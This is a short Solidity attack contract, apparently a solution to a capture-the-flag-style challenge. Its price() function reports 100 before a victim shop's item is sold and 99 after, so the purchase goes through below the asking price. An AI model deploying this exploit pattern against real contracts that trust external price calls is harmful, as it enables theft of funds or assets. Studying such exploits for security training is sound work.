// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IShop {
    function buy() external;

    function isSold() external view returns (bool);
}

contract ShopAttack is Ownable {
    address public victimContract;

    constructor(address addr) {
        victimContract = addr;
    }

    function attack() external onlyOwner {
        IShop(victimContract).buy();
    }

    function price() external view returns (uint256) {
        bool isSold = IShop(victimContract).isSold();

        if (!isSold) {
            return 100;
        } else {
            return 99;
        }
    }
}
